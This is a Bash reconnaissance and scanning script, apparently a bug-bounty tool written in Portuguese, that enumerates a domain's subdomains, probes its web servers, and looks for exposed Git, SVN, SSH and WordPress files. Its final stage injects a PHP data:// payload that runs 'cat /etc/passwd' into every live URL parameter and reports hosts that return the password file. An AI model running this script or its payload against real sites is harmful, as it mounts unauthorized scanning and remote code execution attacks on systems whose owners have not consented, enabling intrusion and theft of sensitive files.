#!/bin/bash

banner()
{
     echo "##############################################"
     echo "# Use: ./bl4dhunt3r dominio.com U N N        #"
     echo "#      ./bl4dhunt3r dominio C S S            #"
     echo "#                                            #"
     echo "#                                            #"
     echo "# Opcoes : dominio.com U N N                 #"
     echo "#          dominio C N N                     #"
     echo "#                                            #"
     echo "#          U  = dominio Unico                #"
     echo "#          S  = Sub dominios                 #"
     echo "#          SS = Sub/Sub dominios             #"
     echo "#          C  = ProjectChaos                 #"
     echo "#                                            #"
     echo "#          S ou N = Verificar tecnologias    #"
     echo "#          S ou N = verifiar WordPress       #"
     echo "#                                            #"
     echo "# Obs: ProjectChaos "C" dominio sem o final   #"
     echo "#############################################"
}

if [ -z "$1" ];
then
    banner
    exit;
elif [ -z "$2" ];
then
    banner
    exit;
elif [ -z "$3" ];
then
     banner
     exit;
elif [ -z "$4" ];
then
    banner
    exit;
fi

#https://hackerone.com/reports/779656

git_array=('/.git' '/.git-rewrite' '/.git/HEAD' '/.git/index' '/.git/logs' '/.gitattributes' '/.gitconfig' '/.gitkeep' '/.gitmodules' '/.gitreview' '/.svn/entries' '/.svnignore' '/.svn/wc.db' '/.git/config' '/.travis.yml' '/.htaccess' '/.bash_history' '/.ssh/known_hosts')
wp_array=('/wp-includes' '/index.php' '/wp-login.php' '/wp-links-opml.php' '/wp-activate.php' '/wp-blog-header.php' '/wp-cron.php' '/wp-links.php' '/wp-mail.php' '/xmlrpc.php' '/wp-settings.php' '/wp-trackback.php' '/wp-admin/setup-config.php?step=1' '/wp-content/plugins/supportboard/supportboard/include/ajax.php' '/wp_inc/' '/wp-config.php.bkp' '/wp-admin/install.php' '/wp-content/plugins/wp-statistics/readme.txt' '/themes/search' '/wp-json/') 


echo -e "\e[1;32m██████╗ ██╗██╗  ██╗██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗██████╗ ██████╗     ██╗   ██╗   ██████╗    ██████╗ "
echo "██╔══██╗██║██║  ██║██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝╚════██╗██╔══██╗    ██║   ██║  ██╔═████╗   ╚════██╗"
echo "██████╔╝██║███████║██║  ██║███████║██║   ██║██╔██╗ ██║   ██║    █████╔╝██████╔╝    ██║   ██║  ██║██╔██║    █████╔╝"
echo "██╔══██╗██║╚════██║██║  ██║██╔══██║██║   ██║██║╚██╗██║   ██║    ╚═══██╗██╔══██╗    ╚██╗ ██╔╝  ████╔╝██║    ╚═══██╗"
echo "██████╔╝███████╗██║██████╔╝██║  ██║╚██████╔╝██║ ╚████║   ██║   ██████╔╝██║  ██║     ╚████╔╝██╗╚██████╔╝██╗██████╔╝"
echo -e "╚═════╝ ╚══════╝╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝      ╚═══╝ ╚═╝ ╚═════╝ ╚═╝╚═════╝ \e[0m"
                                                                                                                  
echo -e "Creditos: Bl4dSc4n\e[0m"
echo -e "\e[1;20;50mLivre uso e modificação, mantenha os creditos em comentario.\e[0m"
echo -e "\e[1;31;50mPs: Nao realize teste em dominios sem permissao\e[0m"

dominio=$1
mkdir $dominio
cd $dominio

if [ $2 == "U" ];
then
    echo -e "\e[1;32mProcurando Dominio Unico\e[0m"
    echo $dominio  > sub4-$dominio

elif [ $2 == "S" ];
then
    echo -e "\e[1;32mProcurando Dominios e Subdominios\e[0m"
    subfinder -d $dominio -silent -o sub4-$dominio
    
elif [ $2 == "SS" ];
then
    echo -e "\e[1;32mProcurando Dominios, Sub-sub \e[0m"
    findomain -q -t $dominio | tee sub-$dominio
    echo $dominio >> sub-$dominio
    subfinder -max-time 5 -timeout 10 -dL sub-$dominio -silent -o sub1-$dominio
    cat sub1-$dominio >> sub-$dominio; cat sub-$dominio | sort -u | tee -a sub4-$dominio
    rm -rf sub-$dominio sub1-$dominio

elif [ $2 == "C" ];
then
    echo -e "\e[1;32mBaixando Dominios do Projeto Chaos \e[0m"
    wget https://chaos-data.projectdiscovery.io/$dominio.zip
    unzip $dominio.zip
    rm $dominio.zip
    cat * > sub4-$dominio
    rm *.txt

fi

echo -e "\e[1;32mProcurando Servidores Web\e[0m"
echo ""
cat sub4-$dominio | httpx -silent -title -tech-detect -random-agent -cdn -cname -ip -follow-redirects | tee sub2-$dominio

if [ $3 == "S" ];
then
    echo -e "\e[1;32m Procurando Tecnologias usadas\e[0m"
    for r in $(awk '{print $1}' sub2-$dominio);do wappy -u $r;done | tee -a Tecnologias-$dominio 
elif [ $3 == "N" ];
then 
    echo "Continuando recon.."
fi
echo -e "\e[1;32m Procurando Links\e[0m"
echo ""
awk '{print $1}' sub2-$dominio | gauplus --random-agent | tee -a links-$dominio 

echo -e "\e[1;32m Extraindo os Heads\e[0m"
for i in $(awk '{print $1}' sub2-$dominio);do echo $i; curl -X OPTIONS $i -I -s -H "user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"; echo -e "\n$i";done | tee -a HTTP-HEADS.TXT


##########################
cat links-$dominio | uro > links-uro
echo -e "\e[1;32m Verificando status dos Links-parametros\e[0m"
httpx -silent -status-code -random-agent -threads 50 -content-length -l links-uro -o parametros_achados

cat parametros_achados | egrep "200|403|500" | awk '{print $1}' > parametros_ativos


echo -e "\e[1;32m Localizando Json\e[0m"
awk '/\.js|\.json/' links-$dominio | httpx -silent -mc 200 -random-agent -threads 50 -o json_achados

if [ $4 == "N" ];
then
   echo -e "\e[1;32mProcurando Git Explosed\e[0m"
   for o in $(printf '%s\n' ${git_array[@]});do awk '{print $1}' sub2-$dominio | httpx -silent -threads 50 -path $o -title -status-code -o arq-sensiveis;done

elif [ $4 == "S" ];
then
   echo -e "\e[1;32mProcurando Arquivos Sensiveis Wordpress & Git Explosed\e[0m"
   for h in $(printf '%s\n' ${git_array[@]} ${wp_array[@]});do awk '{print $1}' sub2-$dominio | httpx -silent -threads 50 -path $h -title -status-code -o arq-sensiveis;done

fi

## Baixando e Analisando arquivos e Vuln
echo -e "\e[1;32m Baixandos arquivos json\e[0m"
for f in $(cat json_achados);do wget $f -q 2>/dev/null;done 
fdupes -N -d . 1>/dev/null
echo -e "\e[1;32m Analisando Arquivos Json\e[0m"
retire -j --colors | tee -a vulnerabilidades2-js 
echo -e "\e[1;32m Injetando Comando\e[0m"
cat parametros_ativos | qsreplace "data://text/plan,%3c?php%20system('cat%20/etc/passwd')%20?%3e" > injetando.txt
for a in $(cat injetando.txt);do curl -s -q -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" $a | grep -q "root:x"&&echo -e "VULN: $a" | notify -silent;done  
echo -e "\e[33;32m Fim do Recon\e[0m"
